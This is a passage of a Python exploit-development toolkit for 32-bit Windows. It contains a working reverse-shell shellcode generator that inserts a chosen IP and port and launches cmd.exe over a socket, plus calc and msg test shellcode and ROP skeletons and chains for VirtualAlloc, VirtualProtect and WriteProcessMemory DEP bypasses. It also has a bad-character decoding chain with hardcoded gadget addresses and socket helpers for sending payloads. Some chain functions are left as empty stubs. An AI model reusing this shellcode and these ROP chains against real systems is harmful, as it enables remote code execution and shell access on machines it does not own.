        except ipaddress.AddressValueError:
            print(f"[!] Error: Invalid IP address '{hostip}'. Exiting...")
            sys.exit(0)

        # Convert port to 2 bytes
        port = hostport.to_bytes(2, byteorder='big')  # Port is always 2 bytes in network byte order

        # Generate assembly for IP and Port
        asmip = b"\x68" + ip  # push IP
        asmport = b"\x66\xb8" + port  # mov ax, PORT
            
        shellcode = (
            b"\x89\xe5"                        # 0x0         mov  ebp, esp
            b"\x81\xc4\xf0\xf9\xff\xff"        # 0x2         add  esp, 0xfffff9f0
            b"\x31\xc9"                        # 0x8         xor  ecx, ecx
            b"\x64\x8b\x71\x30"                # 0x10        mov  esi, dword ptr fs:[ecx + 0x30]
            b"\x8b\x76\x0c"                    # 0x14        mov  esi, dword ptr [esi + 0xc]
            b"\x8b\x76\x1c"                    # 0x17        mov  esi, dword ptr [esi + 0x1c]
            b"\x8b\x5e\x08"                    # 0x20        mov  ebx, dword ptr [esi + 8]
            b"\x8b\x7e\x20"                    # 0x23        mov  edi, dword ptr [esi + 0x20]
            b"\x8b\x36"                        # 0x26        mov  esi, dword ptr [esi]
            b"\x66\x39\x4f\x18"                # 0x28        cmp  word ptr [edi + 0x18], cx
            b"\x75\xf2"                        # 0x32        jne  0x14
            b"\xeb\x06"                        # 0x34        jmp  0x2a
            b"\x5e"                            # 0x36        pop  esi
            b"\x89\x75\x04"                    # 0x37        mov  dword ptr [ebp + 4], esi
            b"\xeb\x54"                        # 0x40        jmp  0x7e
            b"\xe8\xf5\xff\xff\xff"            # 0x42        call 0x24
            b"\x60"                            # 0x47        pushal
            b"\x8b\x43\x3c"                    # 0x48        mov  eax, dword ptr [ebx + 0x3c]
            b"\x8b\x7c\x03\x78"                # 0x51        mov  edi, dword ptr [ebx + eax + 0x78]
            b"\x01\xdf"                        # 0x55        add  edi, ebx
            b"\x8b\x4f\x18"                    # 0x57        mov  ecx, dword ptr [edi + 0x18]
            b"\x8b\x47\x20"                    # 0x60        mov  eax, dword ptr [edi + 0x20]
            b"\x01\xd8"                        # 0x63        add  eax, ebx
            b"\x89\x45\xfc"                    # 0x65        mov  dword ptr [ebp - 4], eax
            b"\xe3\x36"                        # 0x68        jecxz0x7c
            b"\x49"                            # 0x70        dec  ecx
            b"\x8b\x45\xfc"                    # 0x71        mov  eax, dword ptr [ebp - 4]
            b"\x8b\x34\x88"                    # 0x74        mov  esi, dword ptr [eax + ecx*4]
            b"\x01\xde"                        # 0x77        add  esi, ebx
            b"\x31\xc0"                        # 0x79        xor  eax, eax
            b"\x99"                            # 0x81        cdq
            b"\xfc"                            # 0x82        cld
            b"\xac"                            # 0x83        lodsbal, byte ptr [esi]
            b"\x84\xc0"                        # 0x84        test al, al
            b"\x74\x07"                        # 0x86        je   0x5f
            b"\xc1\xca\x0d"                    # 0x88        ror  edx, 0xd
            b"\x01\xc2"                        # 0x91        add  edx, eax
            b"\xeb\xf4"                        # 0x93        jmp  0x53
            b"\x3b\x54\x24\x24"                # 0x95        cmp  edx, dword ptr [esp + 0x24]
            b"\x75\xdf"                        # 0x99        jne  0x44
            b"\x8b\x57\x24"                    # 0x101       mov  edx, dword ptr [edi + 0x24]
            b"\x01\xda"                        # 0x104       add  edx, ebx
            b"\x66\x8b\x0c\x4a"                # 0x106       mov  cx, word ptr [edx + ecx*2]
            b"\x8b\x57\x1c"                    # 0x110       mov  edx, dword ptr [edi + 0x1c]
            b"\x01\xda"                        # 0x113       add  edx, ebx
            b"\x8b\x04\x8a"                    # 0x115       mov  eax, dword ptr [edx + ecx*4]
            b"\x01\xd8"                        # 0x118       add  eax, ebx
            b"\x89\x44\x24\x1c"                # 0x120       mov  dword ptr [esp + 0x1c], eax
            b"\x61"                            # 0x124       popal
            b"\xc3"                            # 0x125       ret
            b"\x68\x83\xb9\xb5\x78"            # 0x126       push 0x78b5b983
            b"\xff\x55\x04"                    # 0x131       call dword ptr [ebp + 4]
            b"\x89\x45\x10"                    # 0x134       mov  dword ptr [ebp + 0x10], eax
            b"\x68\x8e\x4e\x0e\xec"            # 0x137       push 0xec0e4e8e
            b"\xff\x55\x04"                    # 0x142       call dword ptr [ebp + 4]
            b"\x89\x45\x14"                    # 0x145       mov  dword ptr [ebp + 0x14], eax
            b"\x68\x72\xfe\xb3\x16"            # 0x148       push 0x16b3fe72
            b"\xff\x55\x04"                    # 0x153       call dword ptr [ebp + 4]
            b"\x89\x45\x18"                    # 0x156       mov  dword ptr [ebp + 0x18], eax
            b"\x31\xc0"                        # 0x159       xor  eax, eax
            b"\x66\xb8\x6c\x6c"                # 0x161       mov  ax, 0x6c6c
            b"\x50"                            # 0x165       push eax
            b"\x68\x33\x32\x2e\x64"            # 0x166       push 0x642e3233
            b"\x68\x77\x73\x32\x5f"            # 0x171       push 0x5f327377
            b"\x54"                            # 0x176       push esp
            b"\xff\x55\x14"                    # 0x177       call dword ptr [ebp + 0x14]
            b"\x89\xc3"                        # 0x180       mov  ebx, eax
            b"\x68\xcb\xed\xfc\x3b"            # 0x182       push 0x3bfcedcb
            b"\xff\x55\x04"                    # 0x187       call dword ptr [ebp + 4]
            b"\x89\x45\x1c"                    # 0x190       mov  dword ptr [ebp + 0x1c], eax
            b"\x68\xd9\x09\xf5\xad"            # 0x193       push 0xadf509d9
            b"\xff\x55\x04"                    # 0x198       call dword ptr [ebp + 4]
            b"\x89\x45\x20"                    # 0x201       mov  dword ptr [ebp + 0x20], eax
            b"\x68\x0c\xba\x2d\xb3"            # 0x204       push 0xb32dba0c
            b"\xff\x55\x04"                    # 0x209       call dword ptr [ebp + 4]
            b"\x89\x45\x24"                    # 0x212       mov  dword ptr [ebp + 0x24], eax
            b"\x68\xa4\x1a\x70\xc7"            # 0x215       push 0xc7701aa4
            b"\xff\x55\x04"                    # 0x220       call dword ptr [ebp + 4]
            b"\x89\x45\x28"                    # 0x223       mov  dword ptr [ebp + 0x28], eax
            b"\x68\xa4\xad\x2e\xe9"            # 0x226       push 0xe92eada4
            b"\xff\x55\x04"                    # 0x231       call dword ptr [ebp + 4]
            b"\x89\x45\x2c"                    # 0x234       mov  dword ptr [ebp + 0x2c], eax
            b"\x68\xe5\x49\x86\x49"            # 0x237       push 0x498649e5
            b"\xff\x55\x04"                    # 0x242       call dword ptr [ebp + 4]
            b"\x89\x45\x30"                    # 0x245       mov  dword ptr [ebp + 0x30], eax
            b"\x31\xdb"                        # 0x248       xor  ebx, ebx
            b"\x66\xbb\x90\x01"                # 0x250       mov  bx, 0x190
            b"\x29\xdc"                        # 0x254       sub  esp, ebx
            b"\x54"                            # 0x256       push esp
            b"\x83\xc3\x72"                    # 0x257       add  ebx, 0x72
            b"\x53"                            # 0x260       push ebx
            b"\xff\x55\x1c"                    # 0x261       call dword ptr [ebp + 0x1c]
            b"\x31\xc0"                        # 0x264       xor  eax, eax
            b"\x50"                            # 0x266       push eax
            b"\x50"                            # 0x267       push eax
            b"\x50"                            # 0x268       push eax
            b"\xb0\x06"                        # 0x269       mov  al, 6
            b"\x50"                            # 0x271       push eax
            b"\x2c\x05"                        # 0x272       sub  al, 5
            b"\x50"                            # 0x274       push eax
            b"\x40"                            # 0x275       inc  eax
            b"\x50"                            # 0x276       push eax
            b"\xff\x55\x20"                    # 0x277       call dword ptr [ebp + 0x20]
            b"\x89\xc6"                        # 0x280       mov  esi, eax
            b"\x31\xc0"                        # 0x282       xor  eax, eax
            b"\x50"                            # 0x284       push eax
            b"\x50"                            # 0x285       push eax
            b"" + asmip + b""
            b"" + asmport + b""
            b"\xc1\xe0\x10"                    # 0x295       shl  eax, 0x10
            b"\x66\x83\xc0\x02"                # 0x298       add  ax, 2
            b"\x50"                            # 0x302       push eax
            b"\x54"                            # 0x303       push esp
            b"\x5f"                            # 0x304       pop  edi
            b"\x31\xc0"                        # 0x305       xor  eax, eax
            b"\x66\x83\xc0\x10"                # 0x307       add  ax, 0x10
            b"\x50"                            # 0x311       push eax
            b"\x57"                            # 0x312       push edi
            b"\x56"                            # 0x313       push esi
            b"\xff\x55\x28"                    # 0x314       call dword ptr [ebp + 0x28]
            b"\x6a\x01"                        # 0x317       push 1
            b"\x56"                            # 0x319       push esi
            b"\xff\x55\x2c"                    # 0x320       call dword ptr [ebp + 0x2c]
            b"\x31\xc0"                        # 0x323       xor  eax, eax
            b"\x50"                            # 0x325       push eax
            b"\x50"                            # 0x326       push eax
            b"\x56"                            # 0x327       push esi
            b"\xff\x55\x30"                    # 0x328       call dword ptr [ebp + 0x30]
            b"\x89\xc6"                        # 0x331       mov  esi, eax
            b"\x56"                            # 0x333       push esi
            b"\x56"                            # 0x334       push esi
            b"\x56"                            # 0x335       push esi
            b"\x31\xc0"                        # 0x336       xor  eax, eax
            b"\x50"                            # 0x338       push eax
            b"\x50"                            # 0x339       push eax
            b"\xb8\xfe\xfe\xff\xff"            # 0x340       mov  eax, 0xfffffefe
            b"\xf7\xd8"                        # 0x345       neg  eax
            b"\x50"                            # 0x347       push eax
            b"\x31\xc0"                        # 0x348       xor  eax, eax
            b"\x50"                            # 0x350       push eax
            b"\x50"                            # 0x351       push eax
            b"\x50"                            # 0x352       push eax
            b"\x50"                            # 0x353       push eax
            b"\x50"                            # 0x354       push eax
            b"\x50"                            # 0x355       push eax
            b"\x50"                            # 0x356       push eax
            b"\x50"                            # 0x357       push eax
            b"\x50"                            # 0x358       push eax
            b"\x50"                            # 0x359       push eax
            b"\xb0\x44"                        # 0x360       mov  al, 0x44
            b"\x50"                            # 0x362       push eax
            b"\x54"                            # 0x363       push esp
            b"\x5f"                            # 0x364       pop  edi
            b"\xb8\x9b\x87\x9a\xff"            # 0x365       mov  eax, 0xff9a879b
            b"\xf7\xd8"                        # 0x370       neg  eax
            b"\x50"                            # 0x372       push eax
            b"\x68\x63\x6d\x64\x2e"            # 0x373       push 0x2e646d63
            b"\x54"                            # 0x378       push esp
            b"\x5b"                            # 0x379       pop  ebx
            b"\x89\xe0"                        # 0x380       mov  eax, esp
            b"\x31\xc9"                        # 0x382       xor  ecx, ecx
            b"\x66\x81\xc1\x90\x03"            # 0x384       add  cx, 0x390
            b"\x29\xc8"                        # 0x389       sub  eax, ecx
            b"\x50"                            # 0x391       push eax
            b"\x57"                            # 0x392       push edi
            b"\x31\xc0"                        # 0x393       xor  eax, eax
            b"\x50"                            # 0x395       push eax
            b"\x50"                            # 0x396       push eax
            b"\x50"                            # 0x397       push eax
            b"\x40"                            # 0x398       inc  eax
            b"\x50"                            # 0x399       push eax
            b"\x48"                            # 0x400       dec  eax
            b"\x50"                            # 0x401       push eax
            b"\x50"                            # 0x402       push eax
            b"\x53"                            # 0x403       push ebx
            b"\x50"                            # 0x404       push eax
            b"\xff\x55\x18"                    # 0x405       call dword ptr [ebp + 0x18]
            b"\x31\xc9"                        # 0x408       xor  ecx, ecx
            b"\x51"                            # 0x410       push ecx
            b"\x6a\xff"                        # 0x411       push -1
            b"\xff\x55\x10"                    # 0x413       call dword ptr [ebp + 0x10]
        )
        return shellcode

    def asmcalcShellcode():
        # Source from: https://github.com/peterferrie/win-exec-calc-shellcode/tree/master
        # Compiled using;
        # $ nasm -f win32 -o win-exec-calc-shellcode.o win-exec-calc-shellcode.asm
        # $ ld -m i386pe -o win-exec-calc-shellcode.bin win-exec-calc-shellcode.o
        # Payload size: 127 bytes
        shellcode = (
                b"\x31\xc0"                        # 0x0         xor  eax, eax
                b"\x50"                            # 0x2         push eax
                b"\x68\x63\x61\x6c\x63"            # 0x3         push 0x636c6163
                b"\x54"                            # 0x8         push esp
                b"\x59"                            # 0x9         pop  ecx
                b"\x50"                            # 0x10        push eax
                b"\x40"                            # 0x11        inc  eax
                b"\x92"                            # 0x12        xchg eax, edx
                b"\x74\x15"                        # 0x13        je   0x24
                b"\x51"                            # 0x15        push ecx
                b"\x64\x8b\x72\x2f"                # 0x16        mov  esi, dword ptr fs:[edx + 0x2f]
                b"\x8b\x76\x0c"                    # 0x20        mov  esi, dword ptr [esi + 0xc]
                b"\x8b\x76\x0c"                    # 0x23        mov  esi, dword ptr [esi + 0xc]
                b"\xad"                            # 0x26        lodsdeax, dword ptr [esi]
                b"\x8b\x30"                        # 0x27        mov  esi, dword ptr [eax]
                b"\x8b\x7e\x18"                    # 0x29        mov  edi, dword ptr [esi + 0x18]
                b"\xb2\x50"                        # 0x32        mov  dl, 0x50
                b"\xeb\x1a"                        # 0x34        jmp  0x3e
                b"\xb2\x60"                        # 0x36        mov  dl, 0x60
                b"\x48"                            # 0x38        dec  eax
                b"\x29\xd4"                        # 0x39        sub  esp, edx
                b"\x65\x48"                        # 0x41        dec  eax
                b"\x8b\x32"                        # 0x43        mov  esi, dword ptr [edx]
                b"\x48"                            # 0x45        dec  eax
                b"\x8b\x76\x18"                    # 0x46        mov  esi, dword ptr [esi + 0x18]
                b"\x48"                            # 0x49        dec  eax
                b"\x8b\x76\x10"                    # 0x50        mov  esi, dword ptr [esi + 0x10]
                b"\x48"                            # 0x53        dec  eax
                b"\xad"                            # 0x54        lodsdeax, dword ptr [esi]
                b"\x48"                            # 0x55        dec  eax
                b"\x8b\x30"                        # 0x56        mov  esi, dword ptr [eax]
                b"\x48"                            # 0x58        dec  eax
                b"\x8b\x7e\x30"                    # 0x59        mov  edi, dword ptr [esi + 0x30]
                b"\x03\x57\x3c"                    # 0x62        add  edx, dword ptr [edi + 0x3c]
                b"\x8b\x5c\x17\x28"                # 0x65        mov  ebx, dword ptr [edi + edx + 0x28]
                b"\x8b\x74\x1f\x20"                # 0x69        mov  esi, dword ptr [edi + ebx + 0x20]
                b"\x48"                            # 0x73        dec  eax
                b"\x01\xfe"                        # 0x74        add  esi, edi
                b"\x8b\x54\x1f\x24"                # 0x76        mov  edx, dword ptr [edi + ebx + 0x24]
                b"\x0f\xb7\x2c\x17"                # 0x80        movzxebp, word ptr [edi + edx]
                b"\x8d\x52\x02"                    # 0x84        lea  edx, [edx + 2]
                b"\xad"                            # 0x87        lodsdeax, dword ptr [esi]
                b"\x81\x3c\x07\x57\x69\x6e\x45"    # 0x88        cmp  dword ptr [edi + eax], 0x456e6957
                b"\x75\xef"                        # 0x95        jne  0x50
                b"\x8b\x74\x1f\x1c"                # 0x97        mov  esi, dword ptr [edi + ebx + 0x1c]
                b"\x48"                            # 0x101       dec  eax
                b"\x01\xfe"                        # 0x102       add  esi, edi
                b"\x8b\x34\xae"                    # 0x104       mov  esi, dword ptr [esi + ebp*4]
                b"\x48"                            # 0x107       dec  eax
                b"\x01\xf7"                        # 0x108       add  edi, esi
                b"\x99"                            # 0x110       cdq
                b"\xff\xd7"                        # 0x111       call edi
                b"\xff"                            # 0x113       db   0xff
                b"\xff"                            # 0x114       db   0xff
                b"\xff"                            # 0x115       db   0xff
                b"\xff\x00"                        # 0x116       inc  dword ptr [eax]
                b"\x00\x00"                        # 0x118       add  byte ptr [eax], al
                b"\xff"                            # 0x120       db   0xff
                b"\xff"                            # 0x121       db   0xff
                b"\xff"                            # 0x122       db   0xff
                b"\xff\x00"                        # 0x123       inc  dword ptr [eax]
                b"\x00\x00"                        # 0x125       add  byte ptr [eax], al
        )
        return shellcode

    def msfcalcShellcode():
        # msfvenom -p windows/exec CMD="calc.exe" -a x86 -f python -v sc -e shellcode
        # Payload size: 193 bytes
        shellcode =  b""
        shellcode += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
        shellcode += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
        shellcode += b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
        shellcode += b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
        shellcode += b"\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"
        shellcode += b"\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"
        shellcode += b"\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"
        shellcode += b"\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
        shellcode += b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
        shellcode += b"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
        shellcode += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
        shellcode += b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
        shellcode += b"\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
        shellcode += b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"
        shellcode += b"\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
        shellcode += b"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47"
        shellcode += b"\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c"
        shellcode += b"\x63\x2e\x65\x78\x65\x00"
        return shellcode

    def msflocalmsgShellcode():
        # msfvenom -p windows/exec CMD="msg * HELLOHELLO" -a x86 -f python -v shellcode
        # Payload size: 201 bytes
        shellcode =  b""
        shellcode += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
        shellcode += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
        shellcode += b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
        shellcode += b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
        shellcode += b"\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"
        shellcode += b"\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"
        shellcode += b"\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"
        shellcode += b"\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
        shellcode += b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
        shellcode += b"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
        shellcode += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
        shellcode += b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
        shellcode += b"\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
        shellcode += b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"
        shellcode += b"\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
        shellcode += b"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47"
        shellcode += b"\x13\x72\x6f\x6a\x00\x53\xff\xd5\x6d\x73\x67"
        shellcode += b"\x20\x2a\x20\x48\x45\x4c\x4c\x4f\x48\x45\x4c"
        shellcode += b"\x4c\x4f\x00"
        return shellcode

    def encodedShellcode():
        shellcode = b""
        return shellcode

    def encodedShellcodeHex():
        shellcode = b""
        return shellcode

    def mappedbadscchars():
        badchars = b""
        return badchars

    def markedbadscchars():
        markedchars = []
        return markedchars

class ROP:
    # WriteProcessMemory
    # BOOL WriteProcessMemory(
    #   [in]  HANDLE  hProcess,
    #   [in]  LPVOID  lpBaseAddress,
    #   [in]  LPCVOID lpBuffer,
    #   [in]  SIZE_T  nSize,
    #   [out] SIZE_T  *lpNumberOfBytesWritten
    # );
    def wpmSkeleton(intwpmaddr=False,intbaselib=False,offsetscretaddr=False,rophprocess=False,payloadoffsecsc=False,ropnsize=False,offsetwritable=False):
        rop_skel_gadgets = [
            0x41414141,                             # WriteProcessMemory address                                    # intwpmaddr
            0x42424242,                             # Shellcode ret address                                         # offsetscretaddr  
            0xFFFFFFFF,                             # hProcess; Process handle == current process                   # rophprocess
            0x43434343,                             # lpBaseAddress; start of codecave address to write to, .text   # offsetscretaddr  
            0x44444444,                             # lpBuffer; Code to be copied                                   # payloadoffsetsc
            0x45454545,                             # nSize                                                         # ropnsize
            0x46464646,                             # *lpNumberOfBytesWritten                                       # offsetwritable 
        ]
        return rop_skel_gadgets

    # VirtualAlloc
    # Structure:                                 Parameters:
    # LPVOID WINAPI VirtualAlloc(          =>    A pointer to VirtualAlloc()
    #   _In_opt_  LPVOID lpAddress,        =>    Return Address 
    #   _In_      SIZE_T dwSize,           =>    dwSize (0x1) 
    #   _In_      DWORD flAllocationType,  =>    flAllocationType (0x1000) 
    #   _In_      DWORD flProtect          =>    flProtect (0x40) 
    # );
    def vaSkeleton(intvaaddr=False,offsetscretaddr=False,ropdwsize=False,ropflallocationtype=False,ropflprotect=False):
        rop_skel_gadgets = [
            0x41414141,                             # VirtualAlloc address                                          # intvaaddr
            0x42424242,                             # Shellcode ret address                                         # offsetscretaddr
            0x43434343,                             # lpAddress; shellcode address, same as above                   # offsetscretaddr
            0x44444444,                             # dwSize; size of shellcode == 0x1                              # ropdwsize
            0x45454545,                             # flAllocationType == 0x1000                                    # ropflallocationtype
            0x46464646,                             # flProtect == 0x40                                             # ropflprotect
        ]
        return rop_skel_gadgets
    
    # VirtualProtect
    # Structure:                                 Parameters:
    # BOOL VirtualProtect(						--> A pointer to VirtualProtect() ESI
    #  [in]  LPVOID lpAddress,					--> Return Address (Redirect Execution to ESP) ESP
    #  [in]  SIZE_T dwSize,						--> dwSize up to you to chose as needed (0x201) EBX
    #  [in]  DWORD  flNewProtect,				--> flNewProtect (0x40) EDX
    #  [out] PDWORD lpflOldProtect				--> A writable pointer ECX
    # );
    def vpSkeleton(intvpaddr=False,offsetscretaddr=False,ropdwsize=False,ropflnewprotect=False,offsetwritable=False):
        rop_skel_gadgets = [
            0x41414141,                             # VirtualProtect address                                        # intvpaddr
            0x42424242,                             # Shellcode ret address                                         # offsetscretaddr
            0x43434343,                             # lpAddress; shellcode address, same as above                   # offsetscretaddr
            0x44444444,                             # dwSize; size of shellcode                                     # ropdwsize
            0x45454545,                             # flNewProtect == 0x40 RWX                                      # ropflnewprotect
            0x46464646,                             # lpflOldProtect; some writable address                         # offsetwritable
        ]
        return rop_skel_gadgets 

    def chainWriteProcessMemory(intbaselib_dll=False,payloadoffsets=False,ropskeloffsetlpbuf=False,ropdecoderoffseteax=False):
        rop_chain1_gadgets = [
            ### ESP Alignment ###
            # Save current ESP in ESI and EAX
            ropjunk,                                            # Filler
            intbaselib_dll + 0x408d6,                               # push esp ; pop esi ; ret ;
            
            # Patch lpBuffer in ROP skeleton


            # Pointer of lpBuffer in ROP skeleton


            # Patch nSize in ROP skeleton

            # Align EAX with shellcode
              
        ]
        return rop_chain1_gadgets

    def chainVirtualAlloc(intbaselib_dll,offsetwritable,offsetk32heapfree,offsetk32va,ropskelfuncOffset,ropskelscOffset,ropskeleaxscOffset):
        # Optionally; PUSHAD GOALS
        # EAX ???????? => &Kernel32!VirtualAlloc
        # EBX 00000001 => dwSize
        # ECX 00000040 => flProtect
        # EDX 00001000 => flAllocationType
        # ESP ???????? => Unmodified
        # EBP ???????? => Skip 4 bytes
        # ESI ???????? => JMP [EAX]
        # EDI ???????? => RETNOP
        #
        # Optionally; PUSHAD GOALS; alternative
        # EAX = Called after VA completed
        # EBX = dwSize (0x01)
        # ECX = flProtect (0x40)
        # EDX = flAllocationType (0x1000)
        # ESP = lpAddress (automatic)
        # EBP = ReturnTo (stack pivot into a rop nop / jmp esp)
        # ESI = ptr to VirtualAlloc()
        # EDI = ROP NOP (RETN)
        
        rop_chain1_gadgets = [
            ### Future usage ###
            # Clear ESI for future usage

            
            ### ESP Alignment ###
            # Save current ESP in EAX

            # Save to ESI as well
     
            # Use add method for EAX to calculate offset to ROP skeleton
                                       
            
            ### Dereference PTR for VirtualAlloc address ###
    
            # Copy dereferenced value in EDX
                  
            
            ### Shellcode ret address ###
            # Move to next ROP skel argument
 
            # Restore former ESP value stored in ESI for calculations

            # Use add method for EAX to calculate offset to shellcode offset
              
            # Copy dereferenced value in EDX

            # Copy value to EDI additionally for future use

                 
            ### lpAddress; same as above ###
            # Move to next ROP skel argument
          
            # Copy dereferenced value in EDX

                                   
            ### dwSize == 0x1 ###
            # Move to next ROP skel argument

            # Calculate value by negating

            # Copy dereferenced value in EDX

            
            ### flAllocationType == 0x1000 ###
             # Move to next ROP skel argument

             # Calculate value by negating

            # Copy dereferenced value in EDX
         
                       
            ### flProtect == 0x40 ###
            # Move to next ROP skel argument
 
            # Calculate value by negating

            # Copy dereferenced value in EDX

            
            ### Align EAX with shellcode ###
            # Copy previously stored value in EDI to EAX
       
            
                                 
        ]
        return rop_chain1_gadgets

    def chainVirtualProtect(intbaselib_dll,intptrk32vp,ropskelfuncOffset,ropskelscOffset,ropskeloldProtect,ropskeleaxscOffset):
        # Optionally; PUSHAD GOALS
        # EDI - Ptr to RETN
        # ESI - VirtualProtect()
        # EBP - RET pointer
        # ESP - lpAddress
        # EBX - dwSize
        # EDX - flNewProtect
        # ECX - lpflOldProtect
        # EAX - NOPS
        #
        rop_chain1_gadgets = [
            ### ESP Alignment ###
            # Save current ESP in xxx
            intbaselib_dll + 0x0,
            # Use add method for EAX to calculate offset

            ### VirtualProtect address ###

            
            ### Shellcode ret address ###
            # Exchange EBX for EDX to save value; copy to EAX for calculations

            # Add method

            # Restore EBX            

            
            ### lpAddress; same as above ###

            
            ### dwSize ###

            
            ### flNewProtect ###


            ### lpflOldProtect ###        
 

            # Align EAX with shellcode

        ]
        return rop_chain1_gadgets

    def chainscDecoder(encodedsc,offsetDecoding):
        # Loop over badchar indexes
        restoreRop = []
        replacements = Badchars.replacements
        badIndices = Shellcode.mappedbadscchars
        badchars_count = len(badchars)

        for i in range(len(badIndices)):          
            # Calculate offset from previous badchar to current
            offset = badIndices[i] if i == 0 else badIndices[i] - badIndices[i - 1]
            # Negate; include offset of +1 using in 'add' ROP below
            neg_offset = (-offset) & 0xffffffff
            value = 0          
                
            # Iterate over every bad char & add offset to all of them  
            value = next((replacements[j] for j in range(badchars_count) if encodedsc[badIndices[i]] == badchars[j]), 0)
            # ROP; program specific
            negoffsetDecoding = offsetDecoding & 0xffffffff
            neg_value = (value + negoffsetDecoding)
            
            # ROP; ALT
            # Value in BH to add; shift left 8 bits using OR
            #negoffsetDecoding = offsetDecoding & 0xff
            #value = ((value + negoffsetDecoding) << 8) | 0x11110011
            
            # ROP; program specific
            restoreRop_gadgets = [
                # Get offset to next bad char into ecx
                0x10022fd8,                             # pop ecx ; ret ; 
                neg_offset,
                # Adjust eax by this offset to point to next bad char
                0x1001283e,                             # sub eax, ecx ; ret ;   
                0x1001614d,                             # dec eax ; ret ;
                0x61c0a798,                             # xchg eax, edi ; ret ;
                # Decode character
                0x10015442,                             # pop eax ; ret ;   
                neg_value,
                0x61c0a798,                             # xchg eax, edi ; ret ;
                0x1001c0b2,                             # add  [eax+0x00000001], edi ; pop edi ; pop esi ; pop ebp ; pop ebx ; ret ;
                ropjunk,
                ropjunk,
                ropjunk,
                ropjunk,
            ]
            restoreRop.extend(restoreRop_gadgets)
        return restoreRop

    def chainropskelAlign(intbaselib_dll=False):
        rop_chainropskelAlign_gadgets = [
            ### Align EAX with shellcode ###
            # Save current ESP in EAX

            # Use add method for EAX to calculate offset to shellcode offset

        ]
        return rop_chainropskelAlign_gadgets

    def chainropespAlign(offsetesp):
        rop_espalign_gadgets = [
            0x66aca8,                               # push esp ; sub eax, 0x20 ; pop ebx ; ret ;
            0x667a0d,                               # mov eax, ebx ; pop esi ; pop ebx ; ret ;
            0x69696969,                             # Filler
            0x69696969,                             # Filler
            0x67d5c9,                               # pop ecx ; ret 
            0x88888888,                             # Filler for addition
            0x67023f,                               # add eax, ecx ; pop esi ; ret ;
            0x69696969,                             # Filler
            0x67d5c9,                               # pop ecx ; ret          
            Helpers.addhex(offsetesp),              # Add ESP offset
            0x67023f,                               # add eax, ecx ; pop esi ; ret ;
            0x69696969,                             # Filler
            0x483aab,                               # xchg eax, esp ; ret        
        ]
        return rop_espalign_gadgets

class Network:
    class TCP:
        # Create a regular TCP socket
        def createsocktcp(host,port, timeout=timeout):
            socktcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socktcp.settimeout(timeout)
            socktcp.connect((host, port))
            return socktcp

        # Use or create the global TCP socket
        def creategsocktcp(host, port, timeout=timeout):
            global sock
            # If sock is None or closed, recreate the socket
            if not sock or sock.fileno() == -1:
                if sock:
                    sock.close()  # Close the existing socket if it's closed manually
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                sock.connect((host, port))
            return sock

        # Use or create global TCP socket; send and buffered receive
        def sendrecvsocktcp(
            buffer,
            recvsize=1024,
            max_buffer=1024,
            recvbuffered=False,
            sendall=False,
            keepopen=True,
            timeout=socktimeout,
            buffer_timeout=bufftimeout,
            debug=False
        ):
            global sock
            try:
                # Ensure socket is open
                if not (sock and sock.fileno() != -1):
                    if debug:
                        print("[!] Socket not open, reopening...")
                    Network.TCP.creategsocktcp(host, port)

                sock.settimeout(timeout)
                if debug:
                    print(f"[*] Socket timeout set to {timeout} seconds.")

                # Send data
                if sendall:
                    sock.sendall(buffer)
                    if debug:
                        print(f"[✓] Sent {len(buffer)} / {hex(len(buffer))} bytes using sendall().")
                else:
                    sent = sock.send(buffer)
                    if debug:
                        print(f"[✓] Sent {sent} / {hex(sent)} bytes using send().")

                # Buffered receive with max_buffer logic
                if recvbuffered:
                    resp = b""
                    total_received = 0
                    chunk_num = 1
                    if debug:
                        print(f"[*] Starting buffered receive (timeout={buffer_timeout}s, max_buffer={max_buffer})")

                    while True:
                        if max_buffer is not None and total_received >= max_buffer:
                            if debug:
                                print(f"[✓] Maximum buffer size {max_buffer} bytes reached. Stopping receive.")
                            break

                        rlist, _, _ = select.select([sock], [], [], buffer_timeout)
